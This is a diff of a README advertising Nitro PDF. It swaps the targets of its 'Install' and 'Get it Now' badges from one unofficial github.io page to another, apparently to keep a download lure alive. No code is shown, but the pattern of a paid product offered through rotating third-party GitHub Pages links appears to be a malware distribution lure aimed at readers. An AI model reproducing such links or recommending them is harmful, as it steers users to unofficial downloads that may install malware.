@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://andrey-petrov-software.github.io/.github/nitroPDF)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poke-pokemon.github.io/.github/nitroPDF)
 
 </div>
 
@@ -81,7 +81,7 @@ Nitro PDF's value proposition against Adobe Acrobat centers on the pricing model
 
 <p align="center">
 
-[![Get it Now Nitro PDF](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://andrey-petrov-software.github.io/.github/nitroPDF)
+[![Get it Now Nitro PDF](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/nitroPDF)
 
 </p>
 
